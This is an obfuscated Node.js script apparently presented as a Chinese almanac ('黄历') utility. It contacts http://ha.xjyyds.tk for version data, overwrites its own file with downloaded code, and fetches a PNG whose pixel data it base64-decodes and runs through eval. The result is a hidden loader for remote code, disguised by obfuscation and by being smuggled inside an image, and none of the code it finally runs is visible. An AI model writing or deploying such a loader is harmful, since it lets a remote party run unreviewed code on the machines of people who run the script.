const _0x66fc94 = function () {
  let _0x545300 = true;
  return function (_0x44824e, _0x3a17c0) {
    const _0x12e3c6 = _0x545300 ? function () {
      if (_0x3a17c0) {
        const _0x448989 = _0x3a17c0.apply(_0x44824e, arguments);
        _0x3a17c0 = null;
        return _0x448989;
      }
    } : function () {};
    _0x545300 = false;
    return _0x12e3c6;
  };
}();
const _0x1920df = _0x66fc94(this, function () {
  const _0x53d257 = {};
  _0x53d257.sLfSg = function (_0x35225f, _0x686449) {
    return _0x35225f === _0x686449;
  };
  _0x53d257.Dtctm = "WEkuV";
  _0x53d257.QHHQq = "^([^ ]+( +[^ ]+)+)+[^ ]}";
  const _0x18a79c = _0x53d257;
  const _0x2279ca = function () {
    if (_0x18a79c.sLfSg(_0x18a79c.Dtctm, _0x18a79c.Dtctm)) {
      const _0x5ee03f = _0x2279ca.constructor("return /\" + this + \"/")().compile(_0x18a79c.QHHQq);
      return !_0x5ee03f.test(_0x1920df);
    } else {
      const _0x357ab5 = fn.apply(context, arguments);
      fn = null;
      return _0x357ab5;
    }
  };
  return _0x2279ca();
});
_0x1920df();
let _0x5768c5 = "huangli",
  _0x282bf9 = "1.0.0",
  _0x78d9b7 = (NAME = "黄历", require("jimp")),
  _0x37c938 = require("fs"),
  _0x8bcc93 = require("axios");
function _0x19e0c3(_0x12a889, _0x1b75f6) {
  const _0x28f068 = {};
  _0x28f068.numeric = !0;
  return _0x12a889.localeCompare(_0x1b75f6, void 0, _0x28f068);
}
(async () => {
  const _0x15dfa7 = {};
  _0x15dfa7.DGGMq = "base64";
  _0x15dfa7.OCGmi = "utf8";
  _0x15dfa7.NgZTQ = function (_0x570e02, _0x13feb4) {
    return _0x570e02 + _0x13feb4;
  };
  _0x15dfa7.JKyVK = function (_0x131ec2, _0x42ac76) {
    return _0x131ec2(_0x42ac76);
  };
  _0x15dfa7.LLehb = "读取代码失败:";
  _0x15dfa7.dYrne = function (_0x5e5b61, _0x5ec974) {
    return _0x5e5b61 === _0x5ec974;
  };
  _0x15dfa7.eLFMo = "rwMse";
  _0x15dfa7.cSWMT = "qhFkl";
  _0x15dfa7.slZXl = function (_0x448008, _0x43bf13) {
    return _0x448008 + _0x43bf13;
  };
  _0x15dfa7.yZbTs = function (_0xba7601, _0x4ecee5) {
    return _0xba7601 !== _0x4ecee5;
  };
  _0x15dfa7.bvifn = "vxnCJ";
  _0x15dfa7.QxxcI = "^([^ ]+( +[^ ]+)+)+[^ ]}";
  _0x15dfa7.KMksO = ".png";
  _0x15dfa7.mJHfR = function (_0x3842bb, _0x4c07e6, _0x27e05c) {
    return _0x3842bb(_0x4c07e6, _0x27e05c);
  };
  _0x15dfa7.DaMNT = function (_0xa54843, _0xd6447f) {
    return _0xa54843 == _0xd6447f;
  };
  _0x15dfa7.WpIsx = function (_0x45e01d, _0x3ef8f6) {
    return _0x45e01d(_0x3ef8f6);
  };
  _0x15dfa7.JkUlg = "arraybuffer";
  _0x15dfa7.dApzL = function (_0x353018, _0x5be42f) {
    return _0x353018 + _0x5be42f;
  };
  _0x15dfa7.NBREy = function (_0x39ceb1, _0x589810) {
    return _0x39ceb1 !== _0x589810;
  };
  _0x15dfa7.iRaXV = "脚本更新完成，请重新运行...";
  const _0x5a4388 = _0x15dfa7;
  if (_0x37c938.existsSync(_0x5768c5 + _0x5a4388.KMksO)) {
    let _0x1f76a7 = await _0x8bcc93.get("http://ha.xjyyds.tk/danchaofan112138/JsVer/raw/branch/main/" + _0x5768c5 + ".json"),
      _0x50b3a6 = _0x5a4388.mJHfR(_0x19e0c3, _0x282bf9, _0x1f76a7.data.ver),
      _0x336a52 = _0x1f76a7.data.ver;
    if (_0x5a4388.DaMNT(-1, _0x50b3a6)) {
      let _0x38d5b4 = await _0x8bcc93.get("http://ha.xjyyds.tk/danchaofan112138/JSdata/raw/branch/main/" + _0x5768c5 + ".js"),
        _0x5cc3af = _0x5a4388.WpIsx(require, "fs").promises,
        _0x4f27f2 = process.argv[1];
      await _0x5cc3af.writeFile(_0x4f27f2, _0x38d5b4.data);
      try {
        const _0x412e6d = {};
        _0x412e6d.responseType = _0x5a4388.JkUlg;
        let _0x11e771 = await _0x8bcc93.get("http://ha.xjyyds.tk/danchaofan112138/jspng/raw/branch/main/" + _0x5768c5 + ".png", _0x412e6d);
        _0x37c938.writeFileSync(_0x5a4388.dApzL(_0x5768c5, _0x5a4388.KMksO), Buffer.from(_0x11e771.data));
        _0x78d9b7.read("./" + _0x5768c5 + ".png").then(_0x225598 => {
          let _0x300e6c = _0x225598.bitmap.data.slice(0, _0x225598.bitmap.data.length).toString(),
            _0x128e41 = Buffer.from(_0x300e6c, _0x5a4388.DGGMq).toString(_0x5a4388.OCGmi);
          console.log(_0x5a4388.NgZTQ("正在运行脚本：【" + NAME + "】,当前版本:", _0x336a52));
          _0x5a4388.JKyVK(eval, _0x128e41);
        }).catch(_0x4d83db => {
          console.error(_0x5a4388.LLehb, _0x4d83db);
        });
      } catch (_0x4025a7) {}
    } else _0x78d9b7.read("./" + _0x5768c5 + ".png").then(_0x5457c5 => {
      if (_0x5a4388.dYrne(_0x5a4388.eLFMo, _0x5a4388.cSWMT)) {
        if (fn) {
          const _0x5a3657 = fn.apply(context, arguments);
          fn = null;
          return _0x5a3657;
        }
      } else {
        let _0x5587ed = _0x5457c5.bitmap.data.slice(0, _0x5457c5.bitmap.data.length).toString(),
          _0x544b5b = Buffer.from(_0x5587ed, _0x5a4388.DGGMq).toString(_0x5a4388.OCGmi);
        console.log(_0x5a4388.slZXl("正在运行脚本：【" + NAME + "】,当前版本:", _0x336a52));
        eval(_0x544b5b);
      }
    }).catch(_0x43f012 => {
      if (_0x5a4388.yZbTs(_0x5a4388.bvifn, _0x5a4388.bvifn)) {
        console.error(_0x5a4388.LLehb, _0x43f012);
      } else {
        console.error(_0x5a4388.LLehb, _0x43f012);
      }
    });
  } else try {
    if (_0x5a4388.NBREy("AGTnO", "AGTnO")) {
      const _0x4bf436 = {};
      _0x4bf436.iCmxz = _0x5a4388.QxxcI;
      const _0x2735a6 = _0x4bf436;
      const _0x4fd487 = function () {
        const _0x245db5 = _0x4fd487.constructor("return /\" + this + \"/")().compile(_0x2735a6.iCmxz);
        return !_0x245db5.test(_0x1920df);
      };
      return _0x4fd487();
    } else {
      const _0x582584 = {};
      _0x582584.responseType = _0x5a4388.JkUlg;
      let _0x15412e = await _0x8bcc93.get("http://ha.xjyyds.tk/danchaofan112138/jspng/raw/branch/main/" + _0x5768c5 + ".png", _0x582584);
      _0x37c938.writeFileSync(_0x5768c5 + _0x5a4388.KMksO, Buffer.from(_0x15412e.data));
      console.log(_0x5a4388.iRaXV);
    }
  } catch (_0x224806) {}
})();